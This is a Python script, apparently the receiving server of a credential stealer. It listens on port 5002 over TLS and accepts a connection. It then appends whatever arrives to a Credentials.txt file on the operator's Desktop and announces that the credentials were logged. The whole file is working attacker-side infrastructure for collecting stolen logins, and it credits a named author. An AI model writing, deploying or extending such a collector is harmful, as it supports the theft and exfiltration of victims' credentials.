import socket
import ssl
import tempfile
import threading
from pathlib import Path
import colorama
from colorama import Fore
import certs

#
# Autor   ->  an0mal1a
# Name    ->  Pablo
# GitHub  ->  https://github.com/an0mal1a
# Correo  -> pablodiez024@proton.me
#


colorama.init()

def get_user_path():
    return "{}/".format(Path.home())


def write_file_b(text, location, filename):

    # Archivo a crear
    with open(location + filename, "ab") as log:
        log.write(text)


def write_file(text, location, filename):

    # Archivo a crear
    with open(location + filename, "a") as log:
        log.write(text)


def init_recv(secure_conn):
    recv_output(secure_conn)


def recv_output(secure_conn):
    location = get_user_path() + "Desktop/"
    filename = "Credentials.txt"
    lets = []
    while True:
        try:
            data = secure_conn.recv(1024)
            lets.append(data)
            try:
                write_file_b(data, location, filename)
            except Exception as e:
                print("ERROR WITH DATA -> ", data, e)
            if not data:
                break
        except Exception as e:
            return "¡ERROR!", e

    for line in lets:
        try:
            write_file(line.decode(), location, filename)
        except UnicodeDecodeError:
            encodings = ["utf-8", "latin-1", "ascii"]  # Lista de codificaciones a probar
            for encoding in encodings:
                try:
                    decoded_line = line.rstrip().decode(encoding)

                    write_file(decoded_line, location, filename)
                    break
                except UnicodeDecodeError:
                    continue
            else:
                # Si ninguna codificación funciona, utilizar una codificación por defecto o ignorar el error
                decoded_line = line.rstrip().decode(errors="ignore")
                write_file(decoded_line, location, filename)

    write_file("\n\n[!] CREDENTIALS LOGED SUCSSESFULLY\n" + "-" * 50 + "\n\n", location, filename)
    print(Fore.YELLOW + "\n[!] CREDENTIALS LOGED SUCSSESFULLY\n" + Fore.RESET)


def main():
    try:
        host = '0.0.0.0'
        port = 5002

        context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        context.check_hostname = None

        # Creamos un archivo con el certificado
        cert = tempfile.NamedTemporaryFile(delete=False)
        cert.write(certs.get_crte().encode())
        cert.close()

        key = tempfile.NamedTemporaryFile(delete=False)
        key.write(certs.get_locker().encode())
        key.close()

        # Add the certificate and private key to the context.
        context.load_cert_chain(certfile=cert.name, keyfile=key.name)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind((host, port))
        sock.listen(1)

        print(Fore.YELLOW + "|[!] Listening on 5002|")

        conn, addr = sock.accept()
        secure_conn = context.wrap_socket(conn, server_side=True)

        print(Fore.YELLOW + f"\n[!] Connection on port 5002...\t{addr}")

        thread_1 = threading.Thread(target=init_recv(secure_conn))
        thread_1.start()

        thread_1.join()
    except KeyboardInterrupt:
        exit()

if __name__ == "__main__":
    main()
